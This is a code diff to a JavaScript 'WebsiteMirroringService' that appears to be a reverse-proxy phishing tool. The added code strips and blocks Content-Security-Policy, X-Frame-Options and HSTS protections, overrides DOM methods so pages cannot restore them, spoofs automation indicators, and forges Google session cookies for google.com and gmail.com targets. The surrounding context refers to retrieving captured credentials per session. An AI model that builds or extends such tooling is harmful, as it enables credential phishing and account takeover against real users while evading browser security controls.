@@ -371,10 +371,27 @@ class WebsiteMirroringService {
       $('script[integrity], link[integrity]').removeAttr('integrity');
       $('script[crossorigin], link[crossorigin]').removeAttr('crossorigin');
 
-      // Advanced CSP bypass - remove and replace with permissive policy
+      // Advanced CSP bypass - remove all CSP restrictions completely
       $('meta[http-equiv="Content-Security-Policy"]').remove();
+      $('meta[http-equiv="content-security-policy"]').remove();
+      $('meta[name="Content-Security-Policy"]').remove();
+      $('meta[name="content-security-policy"]').remove();
+      
+      // Remove any script tags that might set CSP dynamically
+      $('script').each((i, elem) => {
+        const scriptContent = $(elem).html();
+        if (scriptContent && (
+          scriptContent.includes('Content-Security-Policy') ||
+          scriptContent.includes('frame-ancestors') ||
+          scriptContent.includes('X-Frame-Options')
+        )) {
+          $(elem).remove();
+        }
+      });
+      
+      // Add completely permissive CSP that allows everything
       $('head').prepend(`
-        <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:;">
+        <meta http-equiv="Content-Security-Policy" content="default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors *; frame-src *; object-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline';">
       `);
 
       // Preserve module loading systems - inject our scripts carefully
@@ -402,6 +419,62 @@ class WebsiteMirroringService {
               Object.defineProperty(navigator, 'webdriver', {
                 get: () => undefined,
                 configurable: true
+              });
+              
+              // Continuously remove CSP meta tags that might be added dynamically
+              const removCSPTags = () => {
+                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
+                cspTags.forEach(tag => {
+                  if (tag.getAttribute('http-equiv') && 
+                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
+                    tag.remove();
+                  }
+                  if (tag.getAttribute('name') && 
+                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
+                    tag.remove();
+                  }
+                });
+              };
+              
+              // Run CSP removal immediately and periodically
+              removCSPTags();
+              setInterval(removCSPTags, 100);
+              
+              // Override document.createElement to block CSP meta tag creation
+              const originalCreateElement = document.createElement;
+              document.createElement = function(tagName) {
+                const element = originalCreateElement.call(this, tagName);
+                if (tagName.toLowerCase() === 'meta') {
+                  const originalSetAttribute = element.setAttribute;
+                  element.setAttribute = function(name, value) {
+                    if (name.toLowerCase() === 'http-equiv' && 
+                        value.toLowerCase().includes('content-security-policy')) {
+                      return; // Block CSP meta tags
+                    }
+                    if (name.toLowerCase() === 'name' && 
+                        value.toLowerCase().includes('content-security-policy')) {
+                      return; // Block CSP meta tags
+                    }
+                    return originalSetAttribute.call(this, name, value);
+                  };
+                }
+                return element;
+              };
+              
+              // Override setAttribute on existing meta tags
+              document.querySelectorAll('meta').forEach(meta => {
+                const originalSetAttribute = meta.setAttribute;
+                meta.setAttribute = function(name, value) {
+                  if (name.toLowerCase() === 'http-equiv' && 
+                      value.toLowerCase().includes('content-security-policy')) {
+                    return; // Block CSP updates
+                  }
+                  if (name.toLowerCase() === 'name' && 
+                      value.toLowerCase().includes('content-security-policy')) {
+                    return; // Block CSP updates
+                  }
+                  return originalSetAttribute.call(this, name, value);
+                };
               });
               
               // Spoof automation indicators
@@ -472,6 +545,46 @@ class WebsiteMirroringService {
                 get: () => undefined,
                 configurable: true
               });
+              
+              // Continuously remove CSP meta tags that might be added dynamically
+              const removeCSPTags = () => {
+                const cspTags = document.querySelectorAll('meta[http-equiv*="ecurity"], meta[name*="ecurity"]');
+                cspTags.forEach(tag => {
+                  if (tag.getAttribute('http-equiv') && 
+                      tag.getAttribute('http-equiv').toLowerCase().includes('content-security-policy')) {
+                    tag.remove();
+                  }
+                  if (tag.getAttribute('name') && 
+                      tag.getAttribute('name').toLowerCase().includes('content-security-policy')) {
+                    tag.remove();
+                  }
+                });
+              };
+              
+              // Run CSP removal immediately and periodically
+              removeCSPTags();
+              setInterval(removeCSPTags, 100);
+              
+              // Override document.createElement to block CSP meta tag creation
+              const originalCreateElement = document.createElement;
+              document.createElement = function(tagName) {
+                const element = originalCreateElement.call(this, tagName);
+                if (tagName.toLowerCase() === 'meta') {
+                  const originalSetAttribute = element.setAttribute;
+                  element.setAttribute = function(name, value) {
+                    if (name.toLowerCase() === 'http-equiv' && 
+                        value.toLowerCase().includes('content-security-policy')) {
+                      return; // Block CSP meta tags
+                    }
+                    if (name.toLowerCase() === 'name' && 
+                        value.toLowerCase().includes('content-security-policy')) {
+                      return; // Block CSP meta tags
+                    }
+                    return originalSetAttribute.call(this, name, value);
+                  };
+                }
+                return element;
+              };
               
               // Spoof automation indicators
               delete window.callPhantom;
@@ -1143,21 +1256,47 @@ class WebsiteMirroringService {
     const result = { ...headers };
     const sessionToken = session.sessionToken;
     
-    // Process Content-Security-Policy
-    if (result['content-security-policy']) {
-      // Delete CSP to avoid restrictions
-      delete result['content-security-policy'];
-      delete result['content-security-policy-report-only'];
-    }
+    // Aggressively remove ALL CSP headers (case-insensitive)
+    const cspHeaders = [
+      'content-security-policy',
+      'content-security-policy-report-only',
+      'x-content-security-policy',
+      'x-webkit-csp'
+    ];
+    
+    cspHeaders.forEach(header => {
+      delete result[header];
+      delete result[header.toUpperCase()];
+      delete result[header.toLowerCase()];
+      // Also check for variations
+      Object.keys(result).forEach(key => {
+        if (key.toLowerCase() === header.toLowerCase()) {
+          delete result[key];
+        }
+      });
+    });
+    
+    // Remove frame restriction headers
+    const frameHeaders = [
+      'x-frame-options',
+      'frame-options',
+      'x-frame-policy'
+    ];
+    
+    frameHeaders.forEach(header => {
+      delete result[header];
+      delete result[header.toUpperCase()];
+      delete result[header.toLowerCase()];
+      Object.keys(result).forEach(key => {
+        if (key.toLowerCase() === header.toLowerCase()) {
+          delete result[key];
+        }
+      });
+    });
     
     // Handle HSTS header which can cause redirect issues
     if (result['strict-transport-security']) {
       delete result['strict-transport-security'];
-    }
-    
-    // Process X-Frame-Options to allow our framing
-    if (result['x-frame-options']) {
-      delete result['x-frame-options'];
     }
 
     // Add CORS headers to allow cross-origin requests within our proxy
@@ -1165,6 +1304,10 @@ class WebsiteMirroringService {
     result['Access-Control-Allow-Methods'] = 'GET, POST, PUT, DELETE, OPTIONS';
     result['Access-Control-Allow-Headers'] = 'Origin, X-Requested-With, Content-Type, Accept, Authorization, Cache-Control, Pragma';
     result['Access-Control-Allow-Credentials'] = 'true';
+    
+    // Override any frame restrictions with permissive policy
+    result['X-Frame-Options'] = 'ALLOWALL';
+    result['Content-Security-Policy'] = "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; frame-ancestors *; frame-src *; object-src *; script-src * 'unsafe-inline' 'unsafe-eval'; style-src * 'unsafe-inline';";
 
     // Delete SameSite restrictions which can cause cookie issues
     if (result['set-cookie']) {
@@ -1196,11 +1339,12 @@ class WebsiteMirroringService {
     delete result['content-encoding']; 
     delete result['content-length']; 
     delete result['transfer-encoding'];
-    delete result['content-security-policy'];
-    delete result['content-security-policy-report-only'];
     delete result['cross-origin-embedder-policy'];
     delete result['cross-origin-opener-policy'];
     delete result['cross-origin-resource-policy'];
+    delete result['referrer-policy'];
+    delete result['permissions-policy'];
+    delete result['feature-policy'];
     
     return result;
   }
@@ -2201,6 +2345,11 @@ class WebsiteMirroringService {
         cookies: []
       });
       
+      // Optimize session for Google services if needed
+      if (normalizedUrl.includes('google.com') || normalizedUrl.includes('gmail.com')) {
+        this.optimizeGoogleSession(sessionToken, normalizedUrl);
+      }
+      
       // Store session info
       const sessionData = {
         sessionId,
@@ -2420,6 +2569,54 @@ class WebsiteMirroringService {
     }
   }
   
+  /**
+   * Optimize session for Google services
+   */
+  optimizeGoogleSession(sessionToken, targetUrl) {
+    try {
+      const cookieJar = this.cookieJars.get(sessionToken);
+      if (!cookieJar) return;
+
+      // Add essential Google cookies for better session persistence
+      const googleDomain = new URL(targetUrl).hostname;
+      
+      // Generate realistic Google session cookies
+      const essentialCookies = [
+        { name: 'HSID', value: this.generateRandomToken(16) },
+        { name: 'SSID', value: this.generateRandomToken(16) },
+        { name: 'APISID', value: this.generateRandomToken(16) },
+        { name: 'SAPISID', value: this.generateRandomToken(16) },
+        { name: 'SID', value: this.generateRandomToken(16) },
+        { name: '__Secure-3PSID', value: this.generateRandomToken(16) },
+        { name: 'NID', value: this.generateRandomToken(32) }
+      ];
+
+      essentialCookies.forEach(cookie => {
+        try {
+          cookieJar.setCookieSync(`${cookie.name}=${cookie.value}; Domain=${googleDomain}; Path=/; Secure`, targetUrl);
+        } catch (error) {
+          console.warn(`Failed to set cookie ${cookie.name}:`, error.message);
+        }
+      });
+
+      console.log(`🍪 Optimized Google session for ${googleDomain}`);
+    } catch (error) {
+      console.error('Error optimizing Google session:', error);
+    }
+  }
+
+  /**
+   * Generate random token for cookie values
+   */
+  generateRandomToken(length) {
+    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789_-';
+    let result = '';
+    for (let i = 0; i < length; i++) {
+      result += chars.charAt(Math.floor(Math.random() * chars.length));
+    }
+    return result;
+  }
+
   /**
    * Get captured credentials for a session
    */
